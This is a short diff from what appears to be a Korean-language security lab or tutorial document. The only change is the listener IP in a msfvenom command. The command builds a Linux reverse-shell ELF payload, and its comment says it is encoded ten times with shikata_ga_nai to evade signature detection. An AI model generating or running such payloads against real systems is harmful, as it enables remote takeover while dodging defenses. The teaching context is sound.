@@ -523,7 +523,7 @@ EOF
 ```bash
 # === 1. Payload 인코딩 (msfvenom) ===
 msfvenom -p linux/x64/shell_reverse_tcp \
-    LHOST=192.168.0.112 LPORT=4444 \
+    LHOST=10.20.30.202 LPORT=4444 \
     -e x86/shikata_ga_nai -i 10 \
     -f elf -o /tmp/encoded.elf
 # 인코더 10번 적용 → 시그니처 매칭 회피
